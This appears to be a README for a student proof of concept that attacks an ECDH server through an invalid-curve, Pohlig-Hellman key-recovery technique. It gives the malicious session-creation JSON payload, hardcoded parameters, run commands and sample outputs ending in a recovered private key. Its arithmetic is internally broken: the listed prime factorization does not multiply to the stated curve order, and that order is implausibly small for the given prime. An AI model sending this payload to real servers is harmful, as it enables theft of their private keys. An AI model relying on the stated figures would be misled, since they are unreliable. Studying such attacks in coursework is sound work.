# Overview
This proof of concept demonstrates a practical attack on ECDH key exchange by exploiting weak curve parameters. The attack uses the Pohlig-Hellman algorithm to recover the server's private key by forcing it to perform cryptographic operations on a specially crafted weak elliptic curve with highly factorable order.

# Attack Workflow
Step 1: Discover Weak Curve Parameters
File: find_parameter.py
Why this step:

The ECDH protocol strength depends on the curve parameters. A curve with an order that factors into small primes is vulnerable to the Pohlig-Hellman algorithm.
By searching the parameter space systematically, we can identify curves that are mathematically weak but still valid.

What it does:

Iterates through values of a and b in range [-5, 5]
For each pair, computes the order of the resulting elliptic curve
Identifies curves with smooth orders (products of small primes)
Records results in tab-separated format for analysis

Key parameters found:
a = -5, b = 0
Order = 78463771692333509547947367790095830201048858754879062016
Prime factorization: 2^60 × 3 × 17 × 257 × 641 × 65537 × 274177 × 6700417 × 67280421310721
To run:
bashpython find_parameter.py > weak_curves.txt
Expected output: Tab-separated values showing vulnerable curve parameters.

Step 2: Extract Server's Public Key on Weak Curve
File: send_request.py
Why this step:

The server accepts custom ECDH parameters without validation
By sending weak curve parameters instead of the standard ones, we trick the server into performing key operations on our chosen weak curve
The server uses its long-term private key with these weak parameters, which we can then exploit

What it does:

Sends a POST request to /session/create with malicious curve parameters
Replaces the standard P-192 curve with the weak curve discovered in Step 1
Server responds with its public key computed on the weak curve
Extracts serverPublicKey coordinates for further analysis

Request payload:
json{
  "algorithm": "ecdh",
  "curveParameters": {
    "p": "6277101735386680763835789423207666416083908700390324961279",
    "a": "-5",
    "b": "0",
    "Gx": "5",
    "Gy": "10",
    "order": "78463771692333509547947367790095830201048858754879062016"
  }
}
To run:
bashpython send_request.py
Expected output:
✅ Request sent successfully!
Status Code: 200

{
  "success": true,
  "serverPublicKey": {
    "x": "5233197294312765356589376075911725992289448869762407712776",
    "y": "3643084634250220301091472294076202838344551295239551754216"
  },
  ...
}
Important: Save the serverPublicKey coordinates - they are needed for Step 3.

Step 3: Recover Private Key (Modulo Weak Order)
File: find_private_key_mod_N.py
Why this step:

Given a public key P and base point G on the weak curve, we need to find the private key d where P = d × G
Due to the smooth order, we can use Pohlig-Hellman algorithm to solve this efficiently
The algorithm breaks the problem into smaller subproblems for each prime factor

What it does:

Factorizes the weak curve order into prime powers
For each prime power p^e:

Uses Extended Pohlig-Hellman for large exponents (e.g., 2^60)
Uses Baby-Step Giant-Step (BSGS) for smaller factors


Combines results using Chinese Remainder Theorem to get full solution
Returns d mod (weak order)

Configuration (in script):
pythonP_MOD = 6277101735386680763835789423207666416083908700390324961279
A = -5
B = 0
ORDER = 78463771692333509547947367790095830201048858754879062016

# Server's public key coordinates (from Step 2)
PX = 5233197294312765356589376075911725992289448869762407712776
PY = 3643084634250220301091472294076202838344551295239551754216

# Weak curve base point
GX = 5
GY = 10

# Prime factorization of order
PRIME_FACTORS = {
    2: 60,
    3: 1,
    17: 1,
    257: 1,
    641: 1,
    65537: 1,
    274177: 1,
    6700417: 1,
    67280421310721: 1
}
To run:
bashpython find_private_key_mod_N.py
Expected output:
Initializing Extended Pohlig-Hellman attack...

[+] Processing prime factor 2^60 => q = 1152921504606846976
   → Using Extended Pohlig-Hellman (SUCCESSIVE) for 2^60
   Solution: x ≡ 508277794802486379 (mod 1152921504606846976)

[+] Processing prime factor 3^1 => q = 3
   → Using BSGS (Basic) for q=3
   Solution: x ≡ 0 (mod 3)

... (other prime factors)

==================================================
🎉 RESULT: Recovered Private Key (mod N) =
49134201033619478044010858493061317026287533877631896683
Modulo N = 78463771692333509547947367790095830201048858754879062016
Verification: x*G == P ?  True
==================================================
Output to use in Step 4:

Private key (mod weak order): 49134201033619478044010858493061317026287533877631896683
Modulo value: 78463771692333509547947367790095830201048858754879062016


Step 4: Recover Original Private Key
File: retrieve_private_key.py
Why this step:

The previous step gives us d mod (weak order), but the server's actual private key is much larger
The true private key can be expressed as: d_actual = x + k × weak_order for some integer k
By testing different values of k against the standard P-192 curve, we find the correct one

What it does:

Takes the result from Step 3 (x)
Iterates through candidate values of k (typically -100 to 100)
For each candidate key: d_candidate = x + k × weak_order
Verifies on the standard P-192 curve by checking if d_candidate × G_standard == P_standard
Returns the correct private key when verification succeeds

Configuration (in script):
pythonP_MOD = 6277101735386680763835789423207666416083908700390324961279
A = -3
B = 2455155546008943817740293915197451784769108058161191238065
ORDER = 6277101735386680763835789423176059013767194773182842284081

# Standard P-192 curve generator
GX = 3289624317623424368845348028842487418520868978772050262753
GY = 5673242899673324591834582889556471730778853907191064256384

# Server's standard public key (known from legitimate session)
PX = 2666414626355054857763276393201319872259043665306389055696
PY = 1654459546843298559173321782246873016120528804748946449578
To run:
bashpython retrieve_private_key.py
Expected output:
Searching for key...
Verification: x*G == P ?  True
Found correct private key!
k value = 23
Private Key x = 1853800949957290197646800317665265411650411285239850323051

System Requirements

Python 3.7+
SageMath or compatible Python environment for elliptic curve operations
requests library for HTTP communication

Installation
bash# Install required Python package
pip install requests

# Or using SageMath
sage -pip install requests
Configuration
No special configuration required. The scripts are self-contained with all parameters hardcoded based on the discovered weak curve and server endpoints.

Request Delay Constraint
According to the assignment requirements, there may be rate limiting on the server. Important note: In the current implementation (Step 2: send_request.py), the script sends a single request without explicit delay handling.
If rate limiting enforcement is required:
The script should be modified to include a 1-second delay between requests. However, based on the PoC design, only one request to /session/create is needed to obtain the server's public key on the weak curve. This single request can be executed without delay constraints.
If multiple requests are required for production deployment:
pythonimport time

# Add delay between requests
time.sleep(1)  # 1-second delay

How to Reproduce the Full PoC
Quick Start (Step-by-Step)
1. Discover weak parameters:
bashpython find_parameter.py
# Look for: a=-5, b=0, order=78463771692333509547947367790095830201048858754879062016
2. Send malicious request and capture response:
bashpython send_request.py
# Copy the serverPublicKey coordinates into find_private_key_mod_N.py
3. Recover private key (mod weak order):
bashpython find_private_key_mod_N.py
# Get: x = 49134201033619478044010858493061317026287533877631896683
4. Find the actual private key:
bashpython retrieve_private_key.py
# Get: d = 1853800949957290197646800317665265411650411285239850323051
Complete Execution
bash# Run all steps in sequence
python find_parameter.py > /dev/null
python send_request.py
# Update PX, PY in find_private_key_mod_N.py with server response
python find_private_key_mod_N.py
python retrieve_private_key.py

Key Findings
StepOutputPurpose1Weak curve: a=-5, b=0, smooth orderIdentifies exploitable parameters2Server's public key on weak curveAttack surface exposure3Private key mod weak order (49 digits)Intermediate recovery result4Actual private key (51 digits)Complete key recovery

Why This Attack Works

Server accepts arbitrary curve parameters - No validation of ECDH parameters
Same private key for all curves - Server doesn't use curve-specific keys
Weak curve has smooth order - Allows efficient discrete log computation
No parameter binding - No cryptographic commitment to specific curve


Files Overview
cau3/
├── find_parameter.py              # Step 1: Discover weak curves
├── send_request.py                # Step 2: Extract public key
├── find_private_key_mod_N.py      # Step 3: Pohlig-Hellman DLP solver
├── retrieve_private_key.py        # Step 4: Recover original key
└── README.md                      # This file